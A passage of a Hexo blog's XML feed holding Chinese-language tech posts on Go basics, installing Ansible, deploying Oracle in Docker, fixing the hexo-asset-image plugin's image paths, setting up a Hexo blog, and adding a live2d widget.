punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">}</span>值为：<span class="token number">27</span><span class="token operator">>=</span><span class="token number">20</span>           <span class="token number">9</span> <span class="token number">20</span></code></pre><h2 id="循环和函数"><a href="#循环和函数" class="headerlink" title="循环和函数"></a>循环和函数</h2><pre class=" language-作为练习函数和循环的简单途径，用牛顿法实现开方函数。"><code class="language-作为练习函数和循环的简单途径，用牛顿法实现开方函数。">在这个例子中，牛顿法是通过选择一个初始点 z 然后重复这一过程求 Sqrt(x) 的近似值：z = z - (z*z-x)/(2*z)为了做到这个，只需要重复计算 10 次，并且观察不同的值（1，2，3，……）是如何逐步逼近结果的。然后，修改循环条件，使得当值停止改变（或改变非常小）的时候退出循环。观察迭代次数是否变化。结果与 [[http://golang.org/pkg/math/#Sqrt][math.Sqrt] 接近吗？提示：定义并初始化一个浮点值，向其提供一个浮点语法或使用转换：z := float64(1)z := 1.0</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">sqrt</span><span class="token punctuation">(</span>x <span class="token builtin">float64</span><span class="token punctuation">)</span> <span class="token builtin">float64</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> a  <span class="token operator">=</span>  <span class="token number">0.000001</span>    z <span class="token operator">:=</span> <span class="token function">float64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    k <span class="token operator">:=</span> <span class="token function">float64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">;</span><span class="token punctuation">;</span> z <span class="token operator">=</span> z <span class="token operator">-</span> <span class="token punctuation">(</span>z<span class="token operator">*</span>z<span class="token operator">-</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>z<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> z<span class="token operator">-</span>k <span class="token operator">&lt;=</span> a <span class="token operator">&amp;&amp;</span> z<span class="token operator">-</span>k <span class="token operator">>=</span> <span class="token operator">-</span>a <span class="token punctuation">{</span>            <span class="token keyword">return</span> z        <span class="token punctuation">}</span>        k<span class="token operator">=</span>z    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>值为：<span class="token number">1.4142135623730951</span></code></pre><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><pre><code>switch 的条件从上到下的执行，当匹配成功的时候停止。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"runtime"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"go runs on "</span><span class="token punctuation">)</span>    <span class="token keyword">switch</span> os <span class="token operator">:=</span> runtime<span class="token punctuation">.</span>GOOS<span class="token punctuation">;</span> os <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">"darwin"</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"os x"</span><span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token string">"linux"</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"linux"</span><span class="token punctuation">)</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>os<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><pre><code>defer语句会延迟函数的执行直到上层函数返回。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">defer</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>值为：hello           world</code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装ansible</title>
      <link href="/2018/09/10/ansible/"/>
      <url>/2018/09/10/ansible/</url>
      
        <content type="html"><![CDATA[<h1 id="ANSIBLE"><a href="#ANSIBLE" class="headerlink" title="ANSIBLE"></a>ANSIBLE</h1><h2 id="centos-安装-Minimal版本无法获取IP解决"><a href="#centos-安装-Minimal版本无法获取IP解决" class="headerlink" title="centos 安装 Minimal版本无法获取IP解决"></a>centos 安装 Minimal版本无法获取IP解决</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/sysconfig/network-scripts/ifcfg-ens33ONBOOT<span class="token operator">=</span>yes  <span class="token punctuation">(</span>修改内容<span class="token punctuation">)</span><span class="token function">sudo</span> <span class="token function">reboot</span></code></pre><h2 id="CENTOS-安装-ansible"><a href="#CENTOS-安装-ansible" class="headerlink" title="CENTOS 安装 ansible"></a>CENTOS 安装 ansible</h2><pre class=" language-bash"><code class="language-bash">yum updateyum <span class="token function">install</span> ansible </code></pre><h2 id="Ubuntu-安装-ansible"><a href="#Ubuntu-安装-ansible" class="headerlink" title="Ubuntu 安装 ansible"></a>Ubuntu 安装 ansible</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> software-properties-common<span class="token function">sudo</span> apt-add-repository ppa:ansible/ansible<span class="token function">sudo</span> <span class="token function">apt-get</span>  update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ansible将会报错说无法安装</code></pre><h2 id="Ubuntu-安装-ansible报错解决"><a href="#Ubuntu-安装-ansible报错解决" class="headerlink" title="Ubuntu 安装 ansible报错解决"></a>Ubuntu 安装 ansible报错解决</h2><pre class=" language-bash"><code class="language-bash">添加源<span class="token function">sudo</span> <span class="token function">vi</span> /etc/apt/sources.list</code></pre><pre class=" language-java"><code class="language-java">deb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic main restricted universe multiversedeb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>security main restricted universe multiversedeb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>updates main restricted universe multiversedeb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>proposed main restricted universe multiversedeb http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>backports main restricted universe multiversedeb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic main restricted universe multiversedeb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>security main restricted universe multiversedeb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>updates main restricted universe multiversedeb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>proposed main restricted universe multiversedeb<span class="token operator">-</span>src http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>ubuntu<span class="token operator">/</span> bionic<span class="token operator">-</span>backports main restricted universe multiverse</code></pre><h2 id="ansible-配置"><a href="#ansible-配置" class="headerlink" title="ansible 配置"></a>ansible 配置</h2><h3 id="配置linux主机ssh无密码访问"><a href="#配置linux主机ssh无密码访问" class="headerlink" title="配置linux主机ssh无密码访问"></a>配置linux主机ssh无密码访问</h3><p>一,生成密钥</p><pre class=" language-bash"><code class="language-bash">ssh-keygen<span class="token function">cd</span>   .sshid_rsa 为私钥  id-rsa.pub为公钥</code></pre><p>二,下发公钥</p><pre class=" language-bash"><code class="language-bash">ssh-copy-id     <span class="token punctuation">[</span>-i <span class="token punctuation">[</span>identity_file<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token punctuation">[</span>-p port<span class="token punctuation">]</span>    <span class="token punctuation">[</span>user<span class="token punctuation">]</span>@hostname</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang fmt格式“占位符”</title>
      <link href="/2018/09/10/fmt-ge-shi-zhan-wei-fu/"/>
      <url>/2018/09/10/fmt-ge-shi-zhan-wei-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-fmt格式“占位符”"><a href="#GoLang-fmt格式“占位符”" class="headerlink" title="GoLang fmt格式“占位符”"></a>GoLang fmt格式“占位符”</h1><pre class=" language-go"><code class="language-go">typr human <span class="token keyword">struct</span><span class="token punctuation">{</span>  name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">var</span>  people <span class="token operator">=</span> human<span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">"FUN"</span><span class="token punctuation">}</span>  </code></pre><pre><code>普通占位符占位符         说明                                          举例               输出%v           相应值的默认格式                     printf(&quot;%v&quot;,people)        {FUN}%+v          打印结构体时，会添加字段             printf（“%+v”,people）     {name:&quot;FUN&quot;}</code></pre><pre><code>字符串与字节切片占位符                说明                                  举例                           输出%s           输出字符串表示（string类型或者[]byte） printf（“%s”,[]byte(&quot;GO语言&quot;)）     GO语言%q           安全转义                               printf(&quot;%q&quot;,&quot;go语言&quot;)                “go语言”</code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署Oracle</title>
      <link href="/2018/09/05/docker-bu-shu-oracle/"/>
      <url>/2018/09/05/docker-bu-shu-oracle/</url>
      
        <content type="html"><![CDATA[<h1 id="Oracle部署"><a href="#Oracle部署" class="headerlink" title="Oracle部署"></a>Oracle部署</h1><h2 id="第一部：准备工作"><a href="#第一部：准备工作" class="headerlink" title="第一部：准备工作"></a><strong>第一部：准备工作</strong></h2><p>一、<strong>环境准备</strong></p><p>①　操作系统：Ubuntu 14.04</p><p>②　Docker 版本只适合Ubuntu 14.04</p><p>二、<strong>安装包准备</strong></p><p>①　安装包名：oracle_install.tar.gz</p><h2 id="第二部：Oracle安装"><a href="#第二部：Oracle安装" class="headerlink" title="第二部：Oracle安装"></a><strong>第二部：Oracle安装</strong></h2><p>一、<strong>解压安装包</strong></p><p>①　tar  -zxvf  oracle_install.tar.gz</p><p>二、<strong>执行安装包</strong></p><p>①　cd  oracle </p><p>②　bash  oracle_install.sh</p><h2 id="第三部：服务参数介绍"><a href="#第三部：服务参数介绍" class="headerlink" title="第三部：服务参数介绍"></a><strong>第三部：服务参数介绍</strong></h2><p>一、<strong>ssh远程服务</strong></p><p>①　用户名：root</p><p>②　密码：secret</p><p>③　端口：49160</p><p>④　ssh  root@ip  -p  49160</p><p>二、<strong>Oracle数据库</strong></p><p>①　Hostname: localhost</p><p>②　sid : xe</p><p>③　端口：1521</p><p>④　username: system</p><p>⑤　password: secret</p><p>三、<strong>Tomcat管理</strong></p><p>①　Url: <a href="http://localhost:8080/manager" target="_blank" rel="noopener">http://localhost:8081/manager</a></p><p>②　User : ADMIN</p><p>③　Password : secret</p><p>四、<strong>Oracle Application Express web management</strong></p><p>①　Url: <a href="http://localhost:8080/ords/apex" target="_blank" rel="noopener">http://localhost:8081/ords/apex</a></p><p>②　Worksqpce :INTERNAL</p><p>③　User : ADMIN</p><p>④　Password: secret</p><h2 id="第四部：连接数据库"><a href="#第四部：连接数据库" class="headerlink" title="第四部：连接数据库"></a><strong>第四部：连接数据库</strong></h2><p>一、<strong>配置linux客户端</strong></p><p>①　下载cx_Oracle模块</p><p>②　连接数据库（你会发现正常是无法连接的，执行脚本后按照提示去下载）</p><p><img src="/.io//1.png" alt="img"> </p><p><img src="/.io//2.png" alt="img"> </p><p>③　下载客户端，版本我选择18.3，是向下兼容的，所以可以选择新版本。</p><p>④　创建并解压：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /opt/oracle<span class="token function">cd</span> /opt/oracleunzip instantclient-basic-linux.x64-18.3.0.0.0.zip</code></pre><p>⑤　下载package：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libaio1</code></pre><p>⑥　写入配置：</p><pre class=" language-bash"><code class="language-bash"> <span class="token function">sudo</span> sh -c <span class="token string">"echo /opt/oracle/instantclient_18_3 >  /etc/ld.so.conf.d/oracle-instantclient.conf"</span><span class="token function">sudo</span> ldconfig</code></pre><p>⑦　添加环境变量</p><pre class=" language-bash"><code class="language-bash">ExportLD_LIBRARY_PATH<span class="token operator">=</span>/opt/oracle/instantclient_18_3:  <span class="token variable">$LD_LIBRARY_PATH</span></code></pre><p>⑧　创建子目录</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /opt/oracle/instantclient_12_2/network/admin</code></pre><p>⑨　连接Oracle数据库</p><p><img src="/.io//3.png" alt="img"> </p><p>二、<strong>配置windows客户端</strong></p><p> 如果安装了Oracle数据库并安装了客户端的可以忽略此步骤。</p><p><img src="/.io//4.png" alt="img"> </p><p>①　下载client</p><p><img src="/.io//5.png" alt="img"> </p><p>②　把zip压缩到 C:\oracle\instantclient_12_2</p><p>③　添加环境变量。把路径C:\oracle\instantclient_12_2添加。</p><p><img src="/.io//6.png" alt="img"> </p><p><img src="/.io//7.png" alt="img"> </p><p>④　下载Navicat Premium</p><p>⑤　配置Navicat Premium</p><p><img src="/.io//8.png" alt="img"> </p><p><img src="/.io//9.png" alt="img"> </p><p>⑥　重启Navicat Premium</p><p>⑦　创建连接</p><h2 id="第五部：导入dmp文件"><a href="#第五部：导入dmp文件" class="headerlink" title="第五部：导入dmp文件"></a><strong>第五部：导入dmp文件</strong></h2><p>一、<strong>上传dmp到服务器</strong></p><p>①　执行脚本ssh_scp_server</p><p>②　此脚本为上传dmp和远程到服务器。如果不想修改此脚本连接可以手动上传。</p><p>二、<strong>创建用户</strong></p><p>①　sqlplus system/secret</p><p>②　create  user  用户名  identified  by  密码；</p><p>③　grant  dba  to   用户名;  </p><p>三、<strong>创建表空间</strong></p><p>①　Create tablespace 表空间名称 datafile “${ORACLE_HOME}/xxx.dbf”  size 50m autoextend on;</p><p>②　这是linux语句，如果是windows，填写绝对路径加创建的文件就可以。</p><p>四、<strong>导入dmp</strong></p><p>①　使用imp导入</p><p><img src="/.io//10.png" alt="img"> </p><p>这样就成功能导入成功啦。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-asset-image的苦恼</title>
      <link href="/2018/08/20/hexo-asset-image-de-ku-nao/"/>
      <url>/2018/08/20/hexo-asset-image-de-ku-nao/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-asset-image的苦恼"><a href="#hexo-asset-image的苦恼" class="headerlink" title="hexo-asset-image的苦恼"></a>hexo-asset-image的苦恼</h1><p>博客搞定很激动，写博客加上图片就更奈斯了对不对。<br>可是很蛋疼的是，图片居然解析错了。我也很绝望啊！</p><h2 id="心路历程"><a href="#心路历程" class="headerlink" title="心路历程"></a>心路历程</h2><ul><li>图片放到一个文件夹里面  </li><li>写完md后自己解析图片路径</li></ul><h2 id="百度结果"><a href="#百度结果" class="headerlink" title="百度结果"></a>百度结果</h2><ul><li>使用工具 hexo-asset-image</li></ul><h2 id="hexo-asset-image"><a href="#hexo-asset-image" class="headerlink" title="hexo-asset-image"></a>hexo-asset-image</h2><ul><li>修改_config.yml (post_asset_folder:true)  </li><li>当我们执行 hexo n “title”  </li><li>在source/_posts下面会生成一个xxx.md和一个xxx文件夹</li><li>xxx文件夹是我们md需要引入的图片目录</li></ul><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-asset-image --save <span class="token punctuation">(</span>目前版本0.0.3<span class="token punctuation">)</span>vim _config.ymlhexo n <span class="token string">"hexo-asset-image的苦恼"</span></code></pre><p>举例：hexo-asset-image的苦恼/1.jpg<br>我们markdown的时候需要引入图片1.jpg语法如下</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">!</span><span class="token punctuation">[</span>图片1<span class="token punctuation">]</span><span class="token punctuation">(</span>1.jpg<span class="token punctuation">)</span></code></pre><p>没看出就是这么简单，接下来我们生成静态文件了。</p><pre class=" language-bash"><code class="language-bash">hexo g</code></pre><p>在public/year(2018)/month/day/hexo-asset-image的苦恼/<br>这个目录下会有一个index.html,及1.jpg<br>我们查看一下index.html。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/day/hexo-asset-image的苦恼/1.jpg"</span><span class="token operator">></span>”</code></pre><p>这个怎么解析？<br>不是应该这么解析嘛？</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/year/month/day/hexo-asset-image的苦恼/1.jpg"</span><span class="token operator">></span></code></pre><p>各种百度，兄弟怎么就没有一个给我解释的呢。<br>去愁一愁代码吧，在node_modules下面有一个hexo-asset-image<br>愁一愁index.js 纳尼，为毛是js。反正我是看不懂。</p><pre class=" language-bash"><code class="language-bash">if<span class="token punctuation">(</span>config.post_asset_folder<span class="token punctuation">)</span><span class="token punctuation">{</span>    var <span class="token function">link</span> <span class="token operator">=</span> data.permalink<span class="token punctuation">;</span>        var beginPos <span class="token operator">=</span> getPosition<span class="token punctuation">(</span>link, <span class="token string">'/'</span>, 3<span class="token punctuation">)</span> + 1<span class="token punctuation">;</span>        // In hexo 3.1.1, the permalink of <span class="token string">"about"</span> page is like <span class="token string">".../about/index.html"</span><span class="token keyword">.</span>        var endPos <span class="token operator">=</span> link.lastIndexOf<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> + 1<span class="token punctuation">;</span>    <span class="token function">link</span> <span class="token operator">=</span> link.substring<span class="token punctuation">(</span>beginPos, endPos<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我看不懂，我想大概意思应该是这样吧~<br>Permalink应该指的是_config.yml的吧。</p><pre class=" language-bash"><code class="language-bash">permalink: :year/:month/:day/:title/</code></pre><p>我猜应该是这样的。可是我好奇你为啥是(‘/‘,3)</p><pre class=" language-bash"><code class="language-bash">var beginPos <span class="token operator">=</span> getPosition<span class="token punctuation">(</span>link, <span class="token string">'/'</span>, 3<span class="token punctuation">)</span> + 1<span class="token punctuation">;</span></code></pre><p>我获得的路径是/day/hexo-asset-image的苦恼/1.jpg<br>这个是从day开始分析的。<br>难道是这样year(第一个/)month(第二个/)day(第三个/)<br>所有就是从第三个/解析拼接的嘛。那我们修改成这样试一试。</p><pre class=" language-bash"><code class="language-bash">var beginPos <span class="token operator">=</span> getPosition<span class="token punctuation">(</span>link, <span class="token string">'/'</span>, 1<span class="token punctuation">)</span> + 1<span class="token punctuation">;</span></code></pre><pre class=" language-bash"><code class="language-bash">hexo g</code></pre><p>再去愁一愁index.html的结果是啥样子。  </p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/year/month/day/hexo-asset-image的苦恼/1.jpg"</span><span class="token operator">></span></code></pre><p>soga  原来是这样子啊。</p><h1 id="使用hexo-asset-image总结"><a href="#使用hexo-asset-image总结" class="headerlink" title="使用hexo-asset-image总结"></a>使用hexo-asset-image总结</h1><h2 id="1-安装hexo-asset-image"><a href="#1-安装hexo-asset-image" class="headerlink" title="1.安装hexo-asset-image"></a>1.安装hexo-asset-image</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-asset-image --save</code></pre><h2 id="2-修改index-js"><a href="#2-修改index-js" class="headerlink" title="2.修改index.js"></a>2.修改index.js</h2><pre class=" language-bash"><code class="language-bash">路径 /node_moduls/hexo-asset-image/index.js修改配置  var beginPos <span class="token operator">=</span> getPosition<span class="token punctuation">(</span>link, <span class="token string">'/'</span>, 1<span class="token punctuation">)</span> + 1<span class="token punctuation">;</span></code></pre><h2 id="3-生成静态文件"><a href="#3-生成静态文件" class="headerlink" title="3.生成静态文件"></a>3.生成静态文件</h2><pre class=" language-bash"><code class="language-bash">hexo g</code></pre><h2 id="4-查看网页是否正常解析"><a href="#4-查看网页是否正常解析" class="headerlink" title="4.查看网页是否正常解析"></a>4.查看网页是否正常解析</h2><pre class=" language-bash"><code class="language-bash">hexo s --debug</code></pre><h2 id="5-推到GitHub"><a href="#5-推到GitHub" class="headerlink" title="5.推到GitHub"></a>5.推到GitHub</h2><pre class=" language-bash"><code class="language-bash">hexo ds</code></pre>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何创建你的hexo博客</title>
      <link href="/2018/08/17/ru-he-chuang-jian-ni-de-hexo-bo-ke/"/>
      <url>/2018/08/17/ru-he-chuang-jian-ni-de-hexo-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="如何创建你的hexo博客"><a href="#如何创建你的hexo博客" class="headerlink" title="如何创建你的hexo博客"></a>如何创建你的hexo博客</h1><pre class=" language-bash"><code class="language-bash">也许搭建这套博客系统对小白来说有些麻烦吧，但重点它是免费的！没错你没听错，免费的！那还要啥自行车啊.  还是乖乖充钱买腾讯云，阿里云吧。简单粗暴找一套博客系统解决所有问题，还要什么hexo+github呢。没钱的话还是给我老老实实自己布吧。</code></pre><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><pre class=" language-bash"><code class="language-bash">1.系统：mac/win/linux<span class="token punctuation">(</span>你开心就好，随便挑随便选<span class="token punctuation">)</span>2.软件：git，node.js3.GitHub账号密码</code></pre><h2 id="2-下载git"><a href="#2-下载git" class="headerlink" title="2.下载git"></a>2.下载git</h2><pre class=" language-bash"><code class="language-bash">windows 自行官网下载。  Linux利用命令安装。mac已经自带git，在我印象中是这样的。</code></pre><h2 id="3-下载node-js"><a href="#3-下载node-js" class="headerlink" title="3.下载node.js"></a>3.下载node.js</h2><pre class=" language-bash"><code class="language-bash">1.官网下载选择LTS 长期维护版本2.输入node -v 有版本说明安装成功了。  windows最好是利用git操作。</code></pre><p><img src="/.io//node.jpg" alt="node"></p><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli -g  <span class="token punctuation">(</span>坐等就可以了<span class="token punctuation">)</span></code></pre><p><img src="/.io//hexo-v.jpg" alt="hexo -v"></p><pre class=" language-bash"><code class="language-bash">创建并进入你要存放hexo文件的目录再执行下面代码hexo init  （初始化）</code></pre><h2 id="5-安装主题"><a href="#5-安装主题" class="headerlink" title="5.安装主题"></a>5.安装主题</h2><pre class=" language-bash"><code class="language-bash">https://github.com/fi3ework/hexo-theme-archer   我使用的是这位作者的主题，具体安装过程我就不冗余了。他GitHub上都写的很清楚了。修改好自己的地址。</code></pre><h2 id="6-配置git"><a href="#6-配置git" class="headerlink" title="6.配置git"></a>6.配置git</h2><pre class=" language-bash"><code class="language-bash">https://www.cnblogs.com/superGG1990/p/6844952.html推荐看这个文章，已经码不下去了，写的有点乱。因为自己当初没写笔记。遇见很多问题各种百度解决的，等我写东西我已经忘记了。</code></pre><p><img src="/.io//config1.jpg" alt="config"></p><h2 id="7-配置hexo"><a href="#7-配置hexo" class="headerlink" title="7.配置hexo"></a>7.配置hexo</h2><pre class=" language-bash"><code class="language-bash">hexo s --debug   你可以在本地http://127.0.0.1:4000 来访问你的本地博客hexo clearn <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo d   把你的文件pull到GitHub上了。访问你的站点就可以预览了。username.github.io推荐一篇自行学习原谅我懒https://www.cnblogs.com/visugar/p/6821777.html</code></pre>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客添加hexo-live2d</title>
      <link href="/2018/08/17/gei-bo-ke-tian-jia-hexo-live2d/"/>
      <url>/2018/08/17/gei-bo-ke-tian-jia-hexo-live2d/</url>
      
        <content type="html"><![CDATA[<h1 id="安装live2d"><a href="#安装live2d" class="headerlink" title="安装live2d"></a>安装live2d</h1><p>先上图把，不然估计不知道是啥玩意呢。<br><img src="/.io//cat.png" alt="cat"></p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --save hexo-helper-live2d</code></pre><h2 id="修改根目录-config-yml"><a href="#修改根目录-config-yml" class="headerlink" title="修改根目录_config.yml"></a>修改根目录_config.yml</h2><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Live2D</span><span class="token comment" spellcheck="true">## https://github.com/EYHN/hexo-helper-live2d</span>live2d:  enable: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># enable: false</span>  scriptFrom: local <span class="token comment" spellcheck="true"># 默认</span>  pluginRootPath: live2dw/ <span class="token comment" spellcheck="true"># 插件在站点上的根目录(相对路径)</span>  pluginJsPath: lib/ <span class="token comment" spellcheck="true"># 脚本文件相对与插件根目录路径</span>  pluginModelPath: assets/ <span class="token comment" spellcheck="true"># 模型文件相对与插件根目录路径</span>  <span class="token comment" spellcheck="true"># scriptFrom: jsdelivr # jsdelivr CDN</span>  <span class="token comment" spellcheck="true"># scriptFrom: unpkg # unpkg CDN</span>  <span class="token comment" spellcheck="true"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span>  tagMode: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span>  debug: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 调试, 是否在控制台输出日志</span>  model:    use: live2d-widget-model-wanko <span class="token comment" spellcheck="true"># npm-module package name</span>    <span class="token comment" spellcheck="true"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span>    <span class="token comment" spellcheck="true"># use: ./wives/wanko # 相对于博客根目录的路径</span>    <span class="token comment" spellcheck="true"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></code></pre><p>默认有一个自带模块，你可以根据自己喜欢选择模块</p><h2 id="模块列表"><a href="#模块列表" class="headerlink" 